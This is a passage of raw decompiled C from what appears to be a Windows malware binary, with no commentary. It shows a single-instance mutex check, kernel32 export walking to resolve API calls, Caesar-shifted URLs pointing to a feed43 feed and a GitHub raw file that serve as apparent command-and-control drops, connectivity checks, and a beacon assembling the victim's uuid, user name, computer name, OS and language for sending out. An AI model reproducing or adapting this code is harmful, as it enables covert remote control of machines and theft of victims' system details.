    int32_t v19; // bp-4, 0x40a5b0
    *(char *)((int32_t)&v19 - 80 + v9) = 0;
    int32_t v20; // bp-140244, 0x40a5b0
    char * v21 = (char *)&v20; // bp-48, 0x40a647
    int32_t v22 = function_40a340(v18, &v20, v18); // 0x40a64f
    char ** v23 = &v4; // 0x40a659
    int32_t v24; // 0x40a5b0
    int32_t v25; // 0x40a5b0
    int32_t * v26; // bp-244, 0x40a5b0
    int32_t v27; // bp-88, 0x40a5b0
    if (v22 == 0) {
        goto lab_0x40a822;
    } else {
        // 0x40a65f
        v21 = (char *)&v20;
        char * v28 = StrStrIA((char *)&v20, "&r=1"); // 0x40a66b
        v25 = (int32_t)&v21;
        if (v28 != NULL) {
            goto lab_0x40a7f4;
        } else {
            char * v29 = (char *)&v20; // bp-56, 0x40a680
            char * v30 = StrStrIA((char *)&v20, "404 Not Found"); // 0x40a681
            v23 = &v29;
            if (v30 != NULL) {
                goto lab_0x40a822;
            } else {
                char * v31 = (char *)&v20; // bp-64, 0x40a696
                char * v32 = StrStrIA((char *)&v20, "[["); // 0x40a697
                v23 = &v31;
                if (v32 == NULL) {
                    goto lab_0x40a822;
                } else {
                    char * v33 = (char *)((int32_t)v32 + 2); // 0x40a6ab
                    char * v34 = StrStrIA(v33, "]]"); // 0x40a6ac
                    char * lpString = v33; // bp-76, 0x40a6b4
                    *v34 = 0;
                    int32_t v35 = lstrlenA(lpString); // 0x40a6b8
                    v25 = (int32_t)&lpString;
                    if (v35 == 0) {
                        goto lab_0x40a7f4;
                    } else {
                        int32_t uBytes = lstrlenA((char *)function_40a080()); // 0x40a6cc
                        v10 = uBytes;
                        v27 = 64;
                        int32_t memoryHandle2 = (int32_t)LocalAlloc(64, uBytes); // 0x40a6d1
                        function_409e80();
                        v26 = NULL;
                        _memset(NULL, (int32_t)&g32, (int32_t)&g32);
                        function_406f10();
                        int32_t v36 = memoryHandle2;
                        int32_t v37 = v36 + 1; // 0x40a745
                        while (*(char *)v36 != 0) {
                            // 0x40a740
                            v36 = v37;
                            v37 = v36 + 1;
                        }
                        int32_t v38 = v36 - memoryHandle2; // 0x40a747
                        int32_t v39 = v38 & -0x7ffffff9; // 0x40a74b
                        if (v39 >= 0) {
                            // 0x40a758
                            v24 = v38;
                            if (v39 == 0) {
                                goto lab_0x40a76c;
                            } else {
                                // 0x40a75a
                                v24 = v38 + 8 + (v38 >> 31 & 7) & -8;
                                goto lab_0x40a76c;
                            }
                        } else {
                            // 0x40a753
                            v24 = v38;
                            if ((v38 + 7 & 7) == 7) {
                                goto lab_0x40a76c;
                            } else {
                                // 0x40a75a
                                v24 = v38 + 8 + (v38 >> 31 & 7) & -8;
                                goto lab_0x40a76c;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x40a822:;
    int32_t v40 = (int32_t)v23;
    *(int32_t *)(v40 - 4) = v17;
    LocalFree(&g32);
    *(int32_t *)(v40 - 8) = g25;
    ReleaseMutex(&g32);
    return _40___security_check_cookie_40_4();
  lab_0x40a7f4:
    // 0x40a7f4
    *(int32_t *)(v25 - 4) = v17;
    LocalFree(&g32);
    *(int32_t *)(v25 - 8) = g25;
    ReleaseMutex(&g32);
    return _40___security_check_cookie_40_4();
  lab_0x40a76c:;
    int32_t v41 = &v27; // 0x40a739
    int32_t * v42; // 0x40a5b0
    if (v24 < 1) {
        // 0x40a76c
        v42 = (int32_t *)(v41 - 4);
    } else {
        int32_t * v43 = (int32_t *)(v41 - 4);
        int32_t v44 = (v24 - 1) / 8 + 1; // 0x40a77f
        int32_t v45; // bp-144412, 0x40a5b0
        *v43 = (int32_t)&v45;
        function_406ab0((int32_t)&g32);
        v44--;
        v42 = v43;
        while (v44 != 0) {
            // 0x40a780
            *v43 = (int32_t)&v45;
            function_406ab0((int32_t)&g32);
            v44--;
            v42 = v43;
        }
    }
    int32_t v46 = (int32_t)&v26; // 0x40a7a0
    *v42 = (int32_t)"http://";
    *(int32_t *)(v41 - 8) = v46;
    char * v47 = StrStrIA((char *)&g32, (char *)&g32); // 0x40a7ae
    *(int32_t *)(v41 - 12) = (int32_t)"https://";
    int32_t v48; // bp-237, 0x40a5b0
    int32_t v49 = v47 == NULL ? v46 : (int32_t)&v48; // 0x40a7bd
    int32_t v50 = v41 - 16; // 0x40a7c0
    *(int32_t *)v50 = v49;
    int32_t v51 = StrStrIA((char *)&g32, (char *)&g32) == NULL ? v49 : v49 + 8;
    char v52 = *(char *)v51; // 0x40a7ca
    int32_t v53 = 0; // 0x40a7d6
    if (v52 != 47) {
        char v54 = v52; // 0x40a7dc
        int32_t v55 = 0; // 0x40a7dc
        int32_t v56 = v51; // 0x40a7dc
        v53 = v55;
        while (v54 != 0) {
            // 0x40a7e4
            *(char *)(uFlags - v51 + v56) = v54;
            v55++;
            v56++;
            v54 = *(char *)v56;
            v53 = v55;
            if (v54 == 47) {
                // break -> 0x40a7f0
                break;
            }
            v53 = v55;
        }
    }
    // 0x40a7f0
    *(char *)(v53 + uFlags) = 0;
    v25 = v50;
    goto lab_0x40a7f4;
}

// Address range: 0x40a860 - 0x40ab30
int32_t function_40a860(void) {
    // 0x40a860
    int32_t v1; // bp-1192, 0x40a860
    _memset(&v1, 0, 960);
    int32_t lpString1; // bp-952, 0x40a860
    lstrcpyA((char *)&lpString1, "iuuqt;00gffe54/dpn09822914965984645/ynm");
    int32_t lpString1_; // bp-872, 0x40a860
    char * v2 = (char *)&lpString1_; // bp-1240, 0x40a8b7
    lstrcpyA((char *)&lpString1_, "iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0bmfycpzdpuu0nfuftu0nbtufs0ynm/ynm");
    int128_t v3 = __asm_movdqa(0x6d6d6a7b704e3b756f66684273667456); // 0x40a8ba
    int128_t v4 = __asm_movdqa(g7); // 0x40a8c5
    int128_t v5; // 0x40a860
    __asm_movdqu_10(v5, v3);
    __asm_movdqu_10(0, __asm_movdqa(g17));
    int128_t v6; // 0x40a860
    __asm_movdqu_10(v6, __asm_movdqa(g18));
    int128_t v7; // 0x40a860
    __asm_movdqu_10(v7, __asm_movdqa(g16));
    int128_t v8; // 0x40a860
    __asm_movdqu_10(v8, __asm_movdqa(g20));
    int128_t v9; // 0x40a860
    __asm_movdqu_10(v9, __asm_movdqa(g13));
    int128_t v10; // bp-112, 0x40a860
    int32_t v11 = &v10; // 0x40a936
    int32_t v12 = 3; // 0x40a936
    int128_t * v13 = (int128_t *)(v11 - 16); // 0x40a943
    __asm_movdqu_10(*v13, __asm_psubb(__asm_movdqu(*v13), v4));
    int128_t * v14 = (int128_t *)v11; // 0x40a951
    __asm_movdqu_10(*v14, __asm_psubb(__asm_movdqu(*v14), v4));
    v12--;
    v11 += 32;
    while (v12 != 0) {
        // 0x40a940
        v13 = (int128_t *)(v11 - 16);
        __asm_movdqu_10(*v13, __asm_psubb(__asm_movdqu(*v13), v4));
        v14 = (int128_t *)v11;
        __asm_movdqu_10(*v14, __asm_psubb(__asm_movdqu(*v14), v4));
        v12--;
        v11 += 32;
    }
    for (int32_t i = 96; i < 109; i++) {
        // 0x40a962
        int32_t v15; // bp-4, 0x40a860
        char * v16 = (char *)((int32_t)&v15 - 124 + i); // 0x40a962
        *v16 = *v16 - 1;
    }
    char * lpString = (char *)12; // 0x40a978
    int32_t v17 = &v1;
    int32_t v18 = (int32_t)&v2 - 4; // 0x40a982
    *(int32_t *)v18 = v17;
    int32_t v19 = v18; // 0x40a989
    int32_t v20 = 0; // 0x40a989
    int32_t v21 = v18; // 0x40a989
    char * v22; // 0x40a990
    int32_t v23; // 0x40a993
    int32_t v24; // 0x40a994
    uint32_t v25; // 0x40a995
    if (lstrlenA(lpString) >= 1) {
        v22 = (char *)(v20 + v17);
        *v22 = *v22 - 1;
        v23 = v20 + 1;
        v24 = v19 - 4;
        *(int32_t *)v24 = v17;
        v25 = lstrlenA((char *)&g32);
        v19 = v24;
        v20 = v23;
        v21 = v24;
        while (v23 < v25) {
            // 0x40a990
            v22 = (char *)(v20 + v17);
            *v22 = *v22 - 1;
            v23 = v20 + 1;
            v24 = v19 - 4;
            *(int32_t *)v24 = v17;
            v25 = lstrlenA((char *)&g32);
            v19 = v24;
            v20 = v23;
            v21 = v24;
        }
    }
    int32_t v26 = v21;
    int32_t v27 = (int32_t)lpString - 1; // 0x40a99e
    lpString = (char *)v27;
    int32_t v28 = v17 + 80; // 0x40a9a4
    while (v27 != 0) {
        // 0x40a982
        v17 = v28;
        v18 = v26 - 4;
        *(int32_t *)v18 = v17;
        v19 = v18;
        v20 = 0;
        v21 = v18;
        if (lstrlenA(lpString) >= 1) {
            v22 = (char *)(v20 + v17);
            *v22 = *v22 - 1;
            v23 = v20 + 1;
            v24 = v19 - 4;
            *(int32_t *)v24 = v17;
            v25 = lstrlenA((char *)&g32);
            v19 = v24;
            v20 = v23;
            v21 = v24;
            while (v23 < v25) {
                // 0x40a990
                v22 = (char *)(v20 + v17);
                *v22 = *v22 - 1;
                v23 = v20 + 1;
                v24 = v19 - 4;
                *(int32_t *)v24 = v17;
                v25 = lstrlenA((char *)&g32);
                v19 = v24;
                v20 = v23;
                v21 = v24;
            }
        }
        // 0x40a99b
        v26 = v21;
        v27 = (int32_t)lpString - 1;
        lpString = (char *)v27;
        v28 = v17 + 80;
    }
    // 0x40a9a6
    *(int32_t *)(v26 - 4) = 50;
    *(int32_t *)(v26 - 8) = 64;
    int32_t * memoryHandle = LocalAlloc(0, (int32_t)&g32); // 0x40a9aa
    int32_t v29 = (int32_t)memoryHandle; // 0x40a9aa
    *(int32_t *)(v26 - 12) = 0;
    *(int32_t *)(v26 - 16) = 0;
    *(int32_t *)(v26 - 20) = 0;
    *memoryHandle = 0x6c707061;
    *(int32_t *)(v29 + 4) = 0x74616369;
    *(int32_t *)(v29 + 8) = 0x2f6e6f69;
    *(int32_t *)(v29 + 12) = 0x77772d78;
    *(int32_t *)(v29 + 16) = 0x6f662d77;
    *(int32_t *)(v29 + 20) = 0x752d6d72;
    *(int32_t *)(v29 + 24) = 0x6e656c72;
    *(int32_t *)(v29 + 28) = 0x65646f63;
    *(int16_t *)(v29 + 32) = 100;
    *(int32_t *)(v26 - 24) = 1;
    int128_t v30; // bp-128, 0x40a860
    *(int32_t *)(v26 - 28) = (int32_t)&v30;
    int32_t * v31 = InternetOpenA((char *)&g32, (int32_t)&g32, (char *)&g32, (char *)&g32, (int32_t)&g32); // 0x40a9f9
    g30 = (int32_t)v31;
    *(int32_t *)(v26 - 32) = 0;
    int32_t v32; // bp-1208, 0x40a860
    *(int32_t *)(v26 - 36) = (int32_t)&v32;
    if (!InternetGetConnectedState(&g32, (int32_t)&g32) || g30 == 0) {
        // 0x40ab1d
        return _40___security_check_cookie_40_4();
    }
    int128_t v33 = __asm_movdqa(0x70696b69772e6e652f2f3a7370747468); // 0x40aa28
    *(int32_t *)(v26 - 40) = 0;
    *(int32_t *)(v26 - 44) = 1;
    int128_t v34; // bp-232, 0x40a860
    *(int32_t *)(v26 - 48) = (int32_t)&v34;
    __asm_movdqu_10(0, v33);
    if (!InternetCheckConnectionA((char *)0x61696465, 0x67726f2e, 0)) {
        // 0x40ab1d
        return _40___security_check_cookie_40_4();
    }
    // 0x40aa6c
    int32_t v35; // 0x40a860
    if (function_40a130() != 0) {
        // 0x40aa83
        *(int32_t *)(v26 - 52) = (int32_t)"blog1";
        _printf((char *)&g32);
        // 0x40aa90
        *(int32_t *)v35 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40aab2
    if (function_40a130() != 0 || function_40a130() != 0 || function_40a5b0() != 0 || function_40a5b0() != 0) {
        // 0x40aa90
        *(int32_t *)v35 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40ab02
    if (function_40a5b0() == 0) {
        // 0x40ab1d
        return _40___security_check_cookie_40_4();
    }
    // 0x40aa90
    *(int32_t *)v35 = 1;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40ab30 - 0x40b446
int32_t function_40ab30(int32_t a1) {
    int32_t v1 = a1;
    __chkstk();
    function_4070d0();
    int128_t v2 = __asm_movq(0x33346d666f73666c); // 0x40ab5c
    int32_t v3 = &v1; // bp-28, 0x40ab84
    int32_t v4 = &v3; // 0x40ab84
    __asm_movq_9((int64_t)a1, v2);
    uint32_t v5 = lstrlenA((char *)&g32); // 0x40ab8e
    int32_t v6 = v4; // 0x40ab92
    int32_t v7 = 0; // 0x40ab92
    int32_t v8 = v4; // 0x40ab92
    if (v5 >= 1) {
        int32_t v9 = v6 + 784; // 0x40aba0
        char * v10 = (char *)(v9 + v7); // 0x40aba0
        *v10 = *v10 - 1;
        v6 -= 4;
        *(int32_t *)v6 = v9;
        v7++;
        uint32_t v11 = lstrlenA((char *)&g32); // 0x40abb0
        v8 = v6;
        while (v7 < v11) {
            // 0x40aba0
            v9 = v6 + 784;
            v10 = (char *)(v9 + v7);
            *v10 = *v10 - 1;
            v6 -= 4;
            *(int32_t *)v6 = v9;
            v7++;
            v11 = lstrlenA((char *)&g32);
            v8 = v6;
        }
    }
    int32_t v12 = v8;
    *(int32_t *)(v12 - 4) = (int32_t)"CreateMutexA";
    *(int32_t *)(v12 - 8) = v12 + 784;
    *(int32_t *)(v12 - 12) = (int32_t)GetModuleHandleA((char *)&g32);
    int32_t (*func)() = GetProcAddress(&g32, (char *)&g32); // 0x40abca
    int128_t v13 = __asm_movdqu(0x7373787a7a6a6a6a6a7a7a7373737361); // 0x40abd7
    *(int16_t *)(v12 + 804) = 0x6164;
    *(char *)(v12 + 806) = 0;
    int32_t v14 = v12 + 788; // 0x40abf4
    *(int32_t *)(v12 - 16) = v14;
    *(int32_t *)(v12 - 20) = 1;
    *(int32_t *)(v12 - 24) = 0;
    g27 = (int32_t)func;
    __asm_movdqu_10(*(int128_t *)v14, v13);
    int32_t errorCode = GetLastError(); // 0x40ac10
    *(int32_t *)(v12 - 28) = 0;
    if (errorCode == 183) {
        // 0x40ac1f
        ExitProcess((int32_t)&g32);
        // UNREACHABLE
    }
    // 0x40ac25
    *(int32_t *)(v12 - 32) = 1;
    int32_t * v15 = (int32_t *)(v12 - 36); // 0x40ac27
    *v15 = (int32_t)"https://en.wikipedia.org";
    InternetCheckConnectionA((char *)&g32, (int32_t)&g32, (int32_t)&g32);
    *(int32_t *)(v12 - 40) = (int32_t)L"kernel32.dll";
    LoadLibraryW((int16_t *)&g32);
    int32_t v16 = v12 - 44; // 0x40ac3d
    *(int32_t *)v16 = (int32_t)L"kernel32.dll";
    int32_t v17 = (int32_t)GetModuleHandleW((int16_t *)&g32); // 0x40ac42
    __asm_movdqu_10(*(int128_t *)(v12 + 688), __asm_movdqa(0x6d614e656c6946656c75646f4d746547));
    *(int16_t *)(v12 + 704) = 0x4165;
    *(char *)(v12 + 706) = 0;
    int32_t v18 = *(int32_t *)(v17 + 120 + *(int32_t *)(v17 + 60)) + v17;
    int32_t v19 = *(int32_t *)(v18 + 32) + v17; // 0x40ac7c
    int32_t v20 = *(int32_t *)(v18 + 24) - 1; // 0x40ac7e
    *v15 = v19;
    int32_t v21 = v20; // 0x40ac83
    int32_t v22 = v16; // 0x40ac83
    if (v20 >= 0) {
        int32_t v23 = v16;
        *(int32_t *)(v23 - 4) = v23 + 732;
        int32_t v24 = v23 - 8; // 0x40ac92
        *(int32_t *)v24 = *(int32_t *)(4 * v21 + v19) + v17;
        int32_t v25 = lstrcmpA((char *)&g32, (char *)&g32); // 0x40ac93
        v22 = v24;
        while (v25 != 0) {
            // 0x40ac9d
            v21--;
            int32_t v26 = *(int32_t *)v23; // 0x40ac9e
            v22 = v24;
            if (v21 < 0) {
                // break -> 0x40aca4
                break;
            }
            v23 = v24;
            *(int32_t *)(v23 - 4) = v23 + 732;
            v24 = v23 - 8;
            *(int32_t *)v24 = *(int32_t *)(4 * v21 + v26) + v17;
            v25 = lstrcmpA((char *)&g32, (char *)&g32);
            v22 = v24;
        }
    }
    int32_t v27 = v22;
    int32_t v28 = v27 + 732; // 0x40acab
    int32_t * v29 = (int32_t *)v28; // 0x40acab
    *v29 = 0x61657243;
    int32_t * v30 = (int32_t *)(v27 + 736); // 0x40acb8
    *v30 = 0x72506574;
    int32_t * v31 = (int32_t *)(v27 + 740); // 0x40acc3
    *v31 = 0x7365636f;
    int32_t v32 = v27 + 744; // 0x40acce
    int16_t * v33 = (int16_t *)v32; // 0x40acce
    *v33 = 0x4173;
    char * v34 = (char *)(v27 + 746); // 0x40acd8
    *v34 = 0;
    g26 = function_407140();
    *v29 = 0x61657243;
    *v30 = 0x72506574;
    *v31 = 0x7365636f;
    *v33 = 0x5773;
    *v34 = 0;
    g28 = function_407140();
    *v29 = 0x54746547;
    *v30 = 0x50706d65;
    *v31 = 0x41687461;
    char * v35 = (char *)v32; // 0x40ad5a
    *v35 = 0;
    g23 = function_407140();
    *v29 = 0x64616f4c;
    *v30 = 0x7262694c;
    *v31 = 0x41797261;
    *v35 = 0;
    int32_t v36 = function_407140(); // 0x40ad9e
    *(int32_t *)(v27 - 4) = (int32_t)L"Ws2_32.dll";
    g24 = v36;
    LoadLibraryW((int16_t *)&g32);
    int32_t * v37 = (int32_t *)(v27 - 8); // 0x40adb3
    *v37 = (int32_t)L"Ws2_32.dll";
    GetModuleHandleW((int16_t *)&g32);
    *(int32_t *)(v27 + 724) = 0x53415357;
    *(int32_t *)(v27 + 728) = 0x74726174;
    *(int16_t *)v28 = 0x7075;
    *(char *)(v27 + 734) = 0;
    int32_t v38 = function_407140(); // 0x40adef
    *(int32_t *)(v27 - 12) = v27 + 312;
    *(int32_t *)(v27 - 16) = 514;
    if (v38 != 0) {
        // 0x40ae07
        return _40___security_check_cookie_40_4();
    }
    int128_t v39 = __asm_movdqa(g21); // 0x40ae20
    int32_t v40 = v27 + 840; // 0x40ae28
    int128_t v41 = __asm_movdqa(g7); // 0x40ae2f
    int32_t v42 = v27 + 824; // 0x40ae3c
    __asm_movdqu_10(*(int128_t *)v42, v39);
    *v37 = 0;
    __asm_movdqu_10(*(int128_t *)v40, __asm_movdqa(g9));
    *(int32_t *)(v27 + 936) = 0xb0e0b;
    __asm_movdqu_10(*(int128_t *)(v27 + 856), __asm_movdqa(0x7171422a35375850583c322f3721554f));
    __asm_movdqu_10(*(int128_t *)(v27 + 872), __asm_movdqa(g15));
    __asm_movdqu_10(*(int128_t *)(v27 + 888), __asm_movdqa(g10));
    __asm_movdqu_10(*(int128_t *)(v27 + 904), __asm_movdqa(g12));
    __asm_movdqu_10(*(int128_t *)(v27 + 920), __asm_movdqa(g8));
    int32_t v43 = v40; // 0x40aeb8
    int32_t v44 = 3; // 0x40aeb8
    int128_t * v45 = (int128_t *)(v43 - 16); // 0x40aec4
    __asm_movdqu_10(*v45, __asm_psubb(__asm_movdqu(*v45), v41));
    int128_t * v46 = (int128_t *)v43; // 0x40aed2
    int128_t v47 = __asm_psubb(__asm_movdqu(*v46), v41); // 0x40aed7
    __asm_movdqu_10(*v46, v47);
    v44--;
    v43 += 32;
    int32_t v48 = 96; // 0x40aee1
    while (v44 != 0) {
        // 0x40aec1
        v45 = (int128_t *)(v43 - 16);
        __asm_movdqu_10(*v45, __asm_psubb(__asm_movdqu(*v45), v41));
        v46 = (int128_t *)v43;
        v47 = __asm_psubb(__asm_movdqu(*v46), v41);
        __asm_movdqu_10(*v46, v47);
        v44--;
        v43 += 32;
        v48 = 96;
    }
    char * v49 = (char *)(v48 + v42); // 0x40aee3
    *v49 = *v49 - 1;
    int32_t v50 = v48 + 1; // 0x40aeea
    v48 = v50;
    while (v50 != 115) {
        // 0x40aee3
        v49 = (char *)(v48 + v42);
        *v49 = *v49 - 1;
        v50 = v48 + 1;
        v48 = v50;
    }
    int32_t v51 = v27 - 20; // 0x40aef0
    int32_t * v52 = (int32_t *)v51; // 0x40aef0
    *v52 = 284;
    int32_t v53 = v27 + 16; // 0x40aef5
    int32_t * v54 = (int32_t *)(v27 - 24); // 0x40aef9
    *v54 = 0;
    *(int32_t *)(v27 - 28) = v53;
    _memset(&g32, (int32_t)&g32, (int32_t)&g32);
    *(int32_t *)v53 = 284;
    *v52 = v53;
    GetVersionExW((struct _OSVERSIONINFOW *)&g32);
    *(char *)(v27 + 855) = *(char *)v53 + 48;
    *v54 = 115;
    *(char *)(v27 + 857) = *(char *)(v27 + 20) + 48;
    int32_t v55 = v51; // 0x40af49
    if (function_40a860() == 0) {
        int32_t v56 = v51 - 4; // 0x40af50
        *(int32_t *)v56 = 1000;
        Sleep((int32_t)&g32);
        *(int32_t *)(v51 - 8) = v27 + 1444;
        int32_t v57 = v51 + 1460; // 0x40af71
        v55 = v56;
        while (function_40a860() == 0) {
            int32_t v58 = v56;
            v56 = v58 - 4;
            *(int32_t *)v56 = 1000;
            Sleep((int32_t)&g32);
            *(int32_t *)(v58 - 8) = v57;
            v57 = v58 + 1460;
            v55 = v56;
        }
    }
    int32_t * v59 = (int32_t *)(v55 - 4); // 0x40af73
    *v59 = 199;
    int32_t v60 = v55 + 1064; // 0x40af7f
    *(char *)v60 = 0;
    int32_t * v61 = (int32_t *)(v55 - 8); // 0x40af87
    *v61 = 0;
    int32_t * v62 = (int32_t *)(v55 - 12); // 0x40af89
    *v62 = v55 + 1065;
    _memset(&g32, (int32_t)&g32, (int32_t)&g32);
    int32_t v63 = v55 + 960; // 0x40af92
    *(char *)v63 = 0;
    *v59 = 99;
    *v61 = 0;
    *v62 = v55 + 961;
    _memset(&g32, (int32_t)&g32, (int32_t)&g32);
    int128_t v64 = __asm_xorps(v47, v47); // 0x40afab
    *(char *)(v55 + 729) = 0;
    __asm_movq_9(*(int64_t *)(v55 + 721), v64);
    int32_t v65 = v55 + 720; // 0x40afc2
    int32_t * v66 = (int32_t *)v65; // 0x40afc2
    *v66 = 0x64697575;
    int32_t v67 = v55 + 724; // 0x40afcf
    int16_t * v68 = (int16_t *)v67; // 0x40afcf
    *v68 = 61;
    int32_t v69 = v55 + 1063; // 0x40afea
    int32_t v70 = 0; // 0x40afd9
    char v71 = *(char *)(v70 + v65); // 0x40afe0
    v70++;
    *(char *)(v70 + v69) = v71;
    while (v71 != 0) {
        // 0x40afe0
        v71 = *(char *)(v70 + v65);
        v70++;
        *(char *)(v70 + v69) = v71;
    }
    int32_t v72 = function_405ef0(); // 0x40aff5
    int32_t v73 = v72;
    int32_t v74 = v73 + 1; // 0x40b002
    while (*(char *)v73 != 0) {
        // 0x40b000
        v73 = v74;
        v74 = v73 + 1;
    }
    int32_t v75 = v69 + 1; // 0x40b011
    char * v76 = (char *)v75;
    char v77 = *v76; // 0x40b011
    int32_t v78 = v75; // 0x40b017
    while (v77 != 0) {
        // 0x40b011
        v75 = v78 + 1;
        v76 = (char *)v75;
        v77 = *v76;
        v78 = v75;
    }
    uint32_t v79 = v74 - v72; // 0x40b00e
    *v66 = 0x3d6e7523;
    uint32_t v80 = v79 / 4; // 0x40b026
    __asm_rep_movsd_memcpy(v76, (char *)v72, v80);
    bool v81; // 0x40ab30
    int32_t v82 = v81 ? -4 : 4; // 0x40b029
    char * v83 = (char *)v67; // 0x40b02d
    *v83 = v77;
    char * v84 = (char *)(v75 + v80 * v82); // 0x40b03e
    __asm_rep_movsb_memcpy(v84, v84, v79 & 3);
    int32_t v85 = v65;
    int32_t v86 = v85 + 1; // 0x40b044
    while (*(char *)v85 != 0) {
        // 0x40b042
        v85 = v86;
        v86 = v85 + 1;
    }
    int32_t v87 = v69 + 1; // 0x40b053
    char * v88 = (char *)v87;
    int32_t v89 = v87; // 0x40b059
    while (*v88 != 0) {
        // 0x40b053
        v87 = v89 + 1;
        v88 = (char *)v87;
        v89 = v87;
    }
    uint32_t v90 = v86 - v65; // 0x40b050
    uint32_t v91 = v90 / 4; // 0x40b05d
    char * v92 = (char *)v65; // 0x40b060
    __asm_rep_movsd_memcpy(v88, v92, v91);
    char * v93 = (char *)(v87 + v91 * v82); // 0x40b067
    __asm_rep_movsb_memcpy(v93, v93, v90 & 3);
    int32_t v94 = function_4061e0(); // 0x40b069
    int32_t v95 = v94;
    int32_t v96 = v95 + 1; // 0x40b074
    while (*(char *)v95 != 0) {
        // 0x40b072
        v95 = v96;
        v96 = v95 + 1;
    }
    int32_t v97 = v69 + 1; // 0x40b083
    char * v98 = (char *)v97;
    char v99 = *v98; // 0x40b083
    int32_t v100 = v97; // 0x40b089
    while (v99 != 0) {
        // 0x40b083
        v97 = v100 + 1;
        v98 = (char *)v97;
        v99 = *v98;
        v100 = v97;
    }
    uint32_t v101 = v96 - v94; // 0x40b080
    *v66 = 0x3d6e6323;
    uint32_t v102 = v101 / 4; // 0x40b098
    __asm_rep_movsd_memcpy(v98, (char *)v94, v102);
    *v83 = v99;
    char * v103 = (char *)(v97 + v102 * v82); // 0x40b0b0
    __asm_rep_movsb_memcpy(v103, v103, v101 & 3);
    int32_t v104 = v65;
    int32_t v105 = v104 + 1; // 0x40b0b6
    while (*(char *)v104 != 0) {
        // 0x40b0b4
        v104 = v105;
        v105 = v104 + 1;
    }
    int32_t v106 = v69 + 1; // 0x40b0c5
    char * v107 = (char *)v106;
    int32_t v108 = v106; // 0x40b0cb
    while (*v107 != 0) {
        // 0x40b0c5
        v106 = v108 + 1;
        v107 = (char *)v106;
        v108 = v106;
    }
    uint32_t v109 = v105 - v65; // 0x40b0c2
    uint32_t v110 = v109 / 4; // 0x40b0cf
    __asm_rep_movsd_memcpy(v107, v92, v110);
    char * v111 = (char *)(v106 + v110 * v82); // 0x40b0d9
    __asm_rep_movsb_memcpy(v111, v111, v109 & 3);
    int32_t v112 = function_406160(); // 0x40b0db
    int32_t v113 = v112;
    int32_t v114 = v113 + 1; // 0x40b0e6
    while (*(char *)v113 != 0) {
        // 0x40b0e4
        v113 = v114;
        v114 = v113 + 1;
    }
    int32_t v115 = v69 + 1; // 0x40b0f5
    char * v116 = (char *)v115;
    char v117 = *v116; // 0x40b0f5
    int32_t v118 = v115; // 0x40b0fb
    while (v117 != 0) {
        // 0x40b0f5
        v115 = v118 + 1;
        v116 = (char *)v115;
        v117 = *v116;
        v118 = v115;
    }
    uint32_t v119 = v114 - v112; // 0x40b0f2
    *v66 = 0x3d6e6f23;
    uint32_t v120 = v119 / 4; // 0x40b10a
    __asm_rep_movsd_memcpy(v116, (char *)v112, v120);
    *v83 = v117;
    char * v121 = (char *)(v115 + v120 * v82); // 0x40b122
    __asm_rep_movsb_memcpy(v121, v121, v119 & 3);
    int32_t v122 = v65;
    int32_t v123 = v122 + 1; // 0x40b128
    while (*(char *)v122 != 0) {
        // 0x40b126
        v122 = v123;
        v123 = v122 + 1;
    }
    int32_t v124 = v69 + 1; // 0x40b137
    char * v125 = (char *)v124;
    int32_t v126 = v124; // 0x40b13d
    while (*v125 != 0) {
        // 0x40b137
        v124 = v126 + 1;
        v125 = (char *)v124;
        v126 = v124;
    }
    uint32_t v127 = v123 - v65; // 0x40b134
    uint32_t v128 = v127 / 4; // 0x40b141
    __asm_rep_movsd_memcpy(v125, v92, v128);
    char * v129 = (char *)(v124 + v128 * v82); // 0x40b14b
    __asm_rep_movsb_memcpy(v129, v129, v127 & 3);
    int32_t v130 = function_4063c0(); // 0x40b14d
    int32_t v131 = v130;
    int32_t v132 = v131 + 1; // 0x40b158
    while (*(char *)v131 != 0) {
        // 0x40b156
        v131 = v132;
        v132 = v131 + 1;
    }
    int32_t v133 = v69 + 1; // 0x40b167
    char * v134 = (char *)v133;
    int32_t v135 = v133; // 0x40b16d
    while (*v134 != 0) {
        // 0x40b167
        v133 = v135 + 1;
        v134 = (char *)v133;
        v135 = v133;
    }
    uint32_t v136 = v132 - v130; // 0x40b164
    *v66 = 0x6e616c23;
    uint32_t v137 = v136 / 4; // 0x40b17c
    __asm_rep_movsd_memcpy(v134, (char *)v130, v137);
    *v68 = 61;
    char * v138 = (char *)(v133 + v137 * v82); // 0x40b197
    __asm_rep_movsb_memcpy(v138, v138, v136 & 3);
    int32_t v139 = v65;
    int32_t v140 = v139 + 1; // 0x40b1a2
    while (*(char *)v139 != 0) {
        // 0x40b1a0
        v139 = v140;
        v140 = v139 + 1;
    }
    int32_t v141 = v69 + 1; // 0x40b1b1
    char * v142 = (char *)v141;
    int32_t v143 = v141; // 0x40b1b7
    while (*v142 != 0) {
        // 0x40b1b1
        v141 = v143 + 1;
        v142 = (char *)v141;
        v143 = v141;
    }
    uint32_t v144 = v140 - v65; // 0x40b1ae
    uint32_t v145 = v144 / 4; // 0x40b1bb
    __asm_rep_movsd_memcpy(v142, v92, v145);
    char * v146 = (char *)(v141 + v145 * v82); // 0x40b1c5
    __asm_rep_movsb_memcpy(v146, v146, v144 & 3);
    int32_t v147 = function_406520(); // 0x40b1c7
    int32_t v148 = v147;
    int32_t v149 = v148 + 1; // 0x40b1d2
    while (*(char *)v148 != 0) {
        // 0x40b1d0
        v148 = v149;
        v149 = v148 + 1;
    }
    int32_t v150 = v69 + 1; // 0x40b1e1
    char * v151 = (char *)v150;
    int32_t v152 = v150; // 0x40b1e7
    while (*v151 != 0) {
        // 0x40b1e1
        v150 = v152 + 1;
        v151 = (char *)v150;
        v152 = v150;
    }
    uint32_t v153 = v149 - v147; // 0x40b1de
    *v66 = 0x706f6e23;
    uint32_t v154 = v153 / 4; // 0x40b1f6
    __asm_rep_movsd_memcpy(v151, (char *)v147, v154);
    *v68 = 61;
    char * v155 = (char *)(v150 + v154 * v82); // 0x40b211
    __asm_rep_movsb_memcpy(v155, v155, v153 & 3);
    int32_t v156 = v65;
    int32_t v157 = v156 + 1; // 0x40b217
    while (*(char *)v156 != 0) {
        // 0x40b215
        v156 = v157;
        v157 = v156 + 1;
    }
    int32_t v158 = v69 + 1; // 0x40b226
    char * v159 = (char *)v158;
    char v160 = *v159; // 0x40b226
    int32_t v161 = v158; // 0x40b22c
